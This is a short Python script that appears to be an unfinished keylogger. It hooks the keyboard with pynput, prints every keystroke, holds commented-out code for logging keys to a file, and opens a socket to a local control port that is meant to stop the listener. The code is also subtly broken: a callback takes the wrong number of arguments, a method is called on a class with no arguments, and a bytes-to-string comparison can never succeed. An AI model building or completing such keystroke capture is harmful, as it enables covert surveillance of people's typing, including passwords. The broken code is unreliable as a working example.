from pynput import keyboard
from socket import *

def on_press(key):
    # with open('out', 'a+') as f:
    #     try:
    #         f.write(str(key.char) + '\n')
    #     except AttributeError:
    #         f.write(str(keyasdaas) + '\n')
    #     f.close()
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def on_release(key, s):
    if 'esc' == s.recv(1024):
        print("取消监听")
        return False

def keyboardEvent():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('127.0.0.1',777))
    keyboard.Controller.press()
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release,) as listener:
        listener.join()

if __name__ == '__main__':
    keyboardEvent()
